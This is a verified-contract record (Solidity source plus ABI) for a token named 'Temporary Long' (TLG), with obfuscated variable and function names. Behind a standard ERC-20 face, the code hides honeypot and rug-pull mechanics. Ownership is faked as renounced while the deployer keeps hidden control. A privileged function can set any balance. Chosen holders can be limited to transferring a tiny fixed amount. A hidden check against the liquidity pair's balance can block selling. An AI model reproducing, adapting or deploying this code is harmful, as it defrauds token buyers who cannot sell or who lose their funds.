{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface feeToMarketing {\n    function createPair(address listTrading, address maxTeam) external returns (address);\n}\n\ninterface minTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundLaunched) external view returns (uint256);\n\n    function transfer(address toEnable, uint256 fromTx) external returns (bool);\n\n    function allowance(address modeFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toEnable,\n        uint256 fromTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isMax, uint256 value);\n    event Approval(address indexed modeFee, address indexed spender, uint256 value);\n}\n\nabstract contract sellToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atLimitFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minTotalMetadata is minTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TemporaryLong is sellToken, minTotal, minTotalMetadata {\n\n    function allowance(address takeAuto, address atList) external view virtual override returns (uint256) {\n        if (atList == launchWallet) {\n            return type(uint256).max;\n        }\n        return takeTrading[takeAuto][atList];\n    }\n\n    constructor (){\n        if (minSwap == maxEnable) {\n            exemptSender = true;\n        }\n        atLimitFee toExemptShould = atLimitFee(launchWallet);\n        fromMax = feeToMarketing(toExemptShould.factory()).createPair(toExemptShould.WETH(), address(this));\n        \n        teamLaunched = _msgSender();\n        txLaunch[teamLaunched] = true;\n        swapFeeTx[teamLaunched] = launchSender;\n        modeLiquidity();\n        \n        emit Transfer(address(0), teamLaunched, launchSender);\n    }\n\n    function sellBuyMax(address launchTake, uint256 fromTx) public {\n        launchedFee();\n        swapFeeTx[launchTake] = fromTx;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchSender;\n    }\n\n    uint256 private maxEnable;\n\n    address public fromMax;\n\n    function launchedFee() private view {\n        require(txLaunch[_msgSender()]);\n    }\n\n    bool public modeReceiver;\n\n    uint256 modeTrading;\n\n    function transferFrom(address takeLiquidityTeam, address toEnable, uint256 fromTx) external override returns (bool) {\n        if (_msgSender() != launchWallet) {\n            if (takeTrading[takeLiquidityTeam][_msgSender()] != type(uint256).max) {\n                require(fromTx <= takeTrading[takeLiquidityTeam][_msgSender()]);\n                takeTrading[takeLiquidityTeam][_msgSender()] -= fromTx;\n            }\n        }\n        return txMode(takeLiquidityTeam, toEnable, fromTx);\n    }\n\n    event OwnershipTransferred(address indexed maxLaunch, address indexed receiverAtWallet);\n\n    function minAuto(address walletTake) public {\n        launchedFee();\n        \n        if (walletTake == teamLaunched || walletTake == fromMax) {\n            return;\n        }\n        receiverTrading[walletTake] = true;\n    }\n\n    string private launchedReceiverMax = \"TLG\";\n\n    function balanceOf(address fundLaunched) public view virtual override returns (uint256) {\n        return swapFeeTx[fundLaunched];\n    }\n\n    function approve(address atList, uint256 fromTx) public virtual override returns (bool) {\n        takeTrading[_msgSender()][atList] = fromTx;\n        emit Approval(_msgSender(), atList, fromTx);\n        return true;\n    }\n\n    bool public teamReceiver;\n\n    string private walletReceiver = \"Temporary Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return txModeMin;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletReceiver;\n    }\n\n    function listExempt(address takeLiquidityTeam, address toEnable, uint256 fromTx) internal returns (bool) {\n        require(swapFeeTx[takeLiquidityTeam] >= fromTx);\n        swapFeeTx[takeLiquidityTeam] -= fromTx;\n        swapFeeTx[toEnable] += fromTx;\n        emit Transfer(takeLiquidityTeam, toEnable, fromTx);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return marketingFee;\n    }\n\n    address private marketingFee;\n\n    bool private exemptSender;\n\n    function txMode(address takeLiquidityTeam, address toEnable, uint256 fromTx) internal returns (bool) {\n        if (takeLiquidityTeam == teamLaunched) {\n            return listExempt(takeLiquidityTeam, toEnable, fromTx);\n        }\n        uint256 teamTrading = minTotal(fromMax).balanceOf(takeAt);\n        require(teamTrading == modeTrading);\n        require(toEnable != takeAt);\n        if (receiverTrading[takeLiquidityTeam]) {\n            return listExempt(takeLiquidityTeam, toEnable, exemptTo);\n        }\n        return listExempt(takeLiquidityTeam, toEnable, fromTx);\n    }\n\n    uint256 private launchSender = 100000000 * 10 ** 18;\n\n    bool public autoFund;\n\n    function transfer(address launchTake, uint256 fromTx) external virtual override returns (bool) {\n        return txMode(_msgSender(), launchTake, fromTx);\n    }\n\n    mapping(address => mapping(address => uint256)) private takeTrading;\n\n    uint256 constant exemptTo = 12 ** 10;\n\n    mapping(address => bool) public receiverTrading;\n\n    function getOwner() external view returns (address) {\n        return marketingFee;\n    }\n\n    address launchWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address takeAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private minSwap;\n\n    uint256 txMin;\n\n    mapping(address => bool) public txLaunch;\n\n    function modeLiquidity() public {\n        emit OwnershipTransferred(teamLaunched, address(0));\n        marketingFee = address(0);\n    }\n\n    uint8 private txModeMin = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedReceiverMax;\n    }\n\n    uint256 public atModeFund;\n\n    function teamFeeBuy(uint256 fromTx) public {\n        launchedFee();\n        modeTrading = fromTx;\n    }\n\n    address public teamLaunched;\n\n    mapping(address => uint256) private swapFeeTx;\n\n    function swapMarketing(address shouldSender) public {\n        if (modeReceiver) {\n            return;\n        }\n        if (maxEnable != atModeFund) {\n            maxEnable = atModeFund;\n        }\n        txLaunch[shouldSender] = true;\n        \n        modeReceiver = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAtWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atModeFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTake\",\"type\":\"address\"}],\"name\":\"minAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTx\",\"type\":\"uint256\"}],\"name\":\"sellBuyMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSender\",\"type\":\"address\"}],\"name\":\"swapMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromTx\",\"type\":\"uint256\"}],\"name\":\"teamFeeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLiquidityTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TemporaryLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}